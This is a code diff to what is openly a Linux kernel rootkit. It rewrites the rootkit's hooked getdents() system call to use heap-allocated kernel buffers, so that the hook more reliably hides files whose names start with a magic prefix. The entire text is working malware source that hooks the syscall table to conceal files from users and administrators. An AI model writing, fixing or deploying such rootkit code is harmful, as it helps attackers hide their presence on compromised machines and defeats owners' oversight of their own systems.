@@ -4,6 +4,7 @@
  */
 
 #include "rootkit.h"
+#include <linux/slab.h> // For kmalloc
 
 /*
  * The sys_call_table is an array of void pointers.
@@ -321,9 +322,10 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
   int nread = 0;
   unsigned int bpos = 0, i = 0, j = 0;
   struct linux_dirent *d = NULL;
-  char *user_buf = /*(char *) dirp*/ NULL;
   char starts_with_prefix = 0;
   unsigned int num_bytes_hidden = 0;
+  char *k_buf1 = NULL;
+  char *k_buf2 = NULL;
 
   printk(KERN_ALERT "getdents() hook invoked for %s.\n", current->comm);
 
@@ -336,12 +338,21 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
     return nread;
   }
 
-  user_buf = (char *) dirp;
+//#pragma GCC diagnostic push
+//#pragma GCC diagnostic ignored "-Wdeclaration-after-statement"
+//  char k_buf[count];
+//#pragma GCC diagnostic pop
 
-#pragma GCC diagnostic push
-#pragma GCC diagnostic ignored "-Wdeclaration-after-statement"
-  char k_buf[count];
-#pragma GCC diagnostic pop
+  k_buf1 = kmalloc(count, GFP_KERNEL);
+  if (k_buf1 == NULL) {
+    return nread;
+  }
+
+  k_buf2 = kmalloc(count, GFP_KERNEL);
+  if (k_buf2 == NULL) {
+    kfree(k_buf1);
+    return nread;
+  }
 
   //// Fill k_buf with 0x00 bytes
   //for (i = 0; i < count; ++i) {
@@ -349,10 +360,10 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
   //}
 
   // Copy user space buffer to kernel land buffer
-  copy_from_user(k_buf, dirp, count);
+  copy_from_user(k_buf1, dirp, count);
 
   for (bpos = 0; bpos < (unsigned int)nread;) {
-    d = (struct linux_dirent *) (user_buf + bpos);
+    d = (struct linux_dirent *) (k_buf1 + bpos);
     starts_with_prefix = starts_with(magic_prefix, d->d_name);
 
     printk(KERN_ALERT "entry: %s%s\n", d->d_name,
@@ -360,7 +371,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
 
     if (!starts_with_prefix) {
       for (i = bpos; i < bpos + d->d_reclen; ++i) {
-        k_buf[j++] = user_buf[i];
+        k_buf2[j++] = k_buf1[i];
       }
     } else {
       num_bytes_hidden += d->d_reclen;
@@ -375,7 +386,9 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
   //}
 
   // Copy kernel land buffer to user space buffer
-  copy_to_user(dirp, k_buf, count);
+  copy_to_user(dirp, k_buf2, count);
+  kfree(k_buf1);
+  kfree(k_buf2);
 
   return nread - num_bytes_hidden;
 }
